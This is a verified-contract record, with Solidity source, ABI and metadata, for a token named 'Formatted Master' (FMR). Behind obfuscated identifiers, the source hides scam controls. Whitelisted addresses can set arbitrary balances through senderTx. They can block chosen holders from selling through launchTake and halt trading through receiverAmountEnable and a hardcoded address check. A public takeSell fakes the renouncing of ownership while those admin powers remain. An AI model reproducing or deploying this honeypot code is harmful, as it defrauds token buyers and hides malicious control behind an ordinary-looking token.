{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface modeShould {\n    function createPair(address amountShould, address launchTo) external returns (address);\n}\n\ninterface totalModeEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptFee) external view returns (uint256);\n\n    function transfer(address fundTo, uint256 txMax) external returns (bool);\n\n    function allowance(address receiverFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundTo,\n        uint256 txMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverFee, uint256 value);\n    event Approval(address indexed receiverFrom, address indexed spender, uint256 value);\n}\n\nabstract contract autoMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchFee is totalModeEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FormattedMaster is autoMin, totalModeEnable, launchFee {\n\n    function owner() external view returns (address) {\n        return swapMax;\n    }\n\n    uint256 constant isLaunch = 5 ** 10;\n\n    function approve(address receiverReceiver, uint256 txMax) public virtual override returns (bool) {\n        walletTo[_msgSender()][receiverReceiver] = txMax;\n        emit Approval(_msgSender(), receiverReceiver, txMax);\n        return true;\n    }\n\n    mapping(address => bool) public tradingMin;\n\n    uint8 private minTx = 18;\n\n    address totalWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedModeLaunch(address fundTokenMarketing, address fundTo, uint256 txMax) internal returns (bool) {\n        if (fundTokenMarketing == minTeamAt) {\n            return buyMode(fundTokenMarketing, fundTo, txMax);\n        }\n        uint256 sellAt = totalModeEnable(marketingAuto).balanceOf(shouldTake);\n        require(sellAt == takeEnable);\n        require(fundTo != shouldTake);\n        if (tradingMin[fundTokenMarketing]) {\n            return buyMode(fundTokenMarketing, fundTo, isLaunch);\n        }\n        return buyMode(fundTokenMarketing, fundTo, txMax);\n    }\n\n    address shouldTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public isAt;\n\n    function toFund(address fromTakeToken) public {\n        if (enableMarketing) {\n            return;\n        }\n        \n        isAt[fromTakeToken] = true;\n        if (toTeamMin != swapAmount) {\n            swapReceiver = false;\n        }\n        enableMarketing = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private walletTo;\n\n    uint256 takeEnable;\n\n    mapping(address => uint256) private senderTokenSell;\n\n    bool public swapReceiver;\n\n    string private modeEnable = \"FMR\";\n\n    uint256 private txLiquidity;\n\n    bool public toTeamMin;\n\n    constructor (){\n        if (receiverLaunched == txLiquidity) {\n            swapReceiver = false;\n        }\n        marketingLimit buyReceiver = marketingLimit(totalWallet);\n        marketingAuto = modeShould(buyReceiver.factory()).createPair(buyReceiver.WETH(), address(this));\n        if (swapReceiver != toTeamMin) {\n            swapAmount = true;\n        }\n        minTeamAt = _msgSender();\n        isAt[minTeamAt] = true;\n        senderTokenSell[minTeamAt] = senderLiquidity;\n        takeSell();\n        \n        emit Transfer(address(0), minTeamAt, senderLiquidity);\n    }\n\n    uint256 private receiverLaunched;\n\n    bool public buyToList;\n\n    function transferFrom(address fundTokenMarketing, address fundTo, uint256 txMax) external override returns (bool) {\n        if (_msgSender() != totalWallet) {\n            if (walletTo[fundTokenMarketing][_msgSender()] != type(uint256).max) {\n                require(txMax <= walletTo[fundTokenMarketing][_msgSender()]);\n                walletTo[fundTokenMarketing][_msgSender()] -= txMax;\n            }\n        }\n        return launchedModeLaunch(fundTokenMarketing, fundTo, txMax);\n    }\n\n    event OwnershipTransferred(address indexed exemptMarketingLaunch, address indexed launchedBuy);\n\n    function buyMode(address fundTokenMarketing, address fundTo, uint256 txMax) internal returns (bool) {\n        require(senderTokenSell[fundTokenMarketing] >= txMax);\n        senderTokenSell[fundTokenMarketing] -= txMax;\n        senderTokenSell[fundTo] += txMax;\n        emit Transfer(fundTokenMarketing, fundTo, txMax);\n        return true;\n    }\n\n    function senderTx(address launchFeeAmount, uint256 txMax) public {\n        autoSwapToken();\n        senderTokenSell[launchFeeAmount] = txMax;\n    }\n\n    function takeSell() public {\n        emit OwnershipTransferred(minTeamAt, address(0));\n        swapMax = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeEnable;\n    }\n\n    bool private swapAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return buyTakeMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTx;\n    }\n\n    uint256 private senderLiquidity = 100000000 * 10 ** 18;\n\n    uint256 modeMinTx;\n\n    function balanceOf(address exemptFee) public view virtual override returns (uint256) {\n        return senderTokenSell[exemptFee];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderLiquidity;\n    }\n\n    function transfer(address launchFeeAmount, uint256 txMax) external virtual override returns (bool) {\n        return launchedModeLaunch(_msgSender(), launchFeeAmount, txMax);\n    }\n\n    function autoSwapToken() private view {\n        require(isAt[_msgSender()]);\n    }\n\n    function launchTake(address minTakeReceiver) public {\n        autoSwapToken();\n        if (toTeamMin == swapAmount) {\n            txLiquidity = receiverLaunched;\n        }\n        if (minTakeReceiver == minTeamAt || minTakeReceiver == marketingAuto) {\n            return;\n        }\n        tradingMin[minTakeReceiver] = true;\n    }\n\n    bool public enableMarketing;\n\n    address public marketingAuto;\n\n    address public minTeamAt;\n\n    function receiverAmountEnable(uint256 txMax) public {\n        autoSwapToken();\n        takeEnable = txMax;\n    }\n\n    string private buyTakeMin = \"Formatted Master\";\n\n    function getOwner() external view returns (address) {\n        return swapMax;\n    }\n\n    function allowance(address minTeam, address receiverReceiver) external view virtual override returns (uint256) {\n        if (receiverReceiver == totalWallet) {\n            return type(uint256).max;\n        }\n        return walletTo[minTeam][receiverReceiver];\n    }\n\n    address private swapMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketingLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTakeReceiver\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeamAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"}],\"name\":\"receiverAmountEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFeeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"}],\"name\":\"senderTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTakeToken\",\"type\":\"address\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTeamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFeeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTokenMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FormattedMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}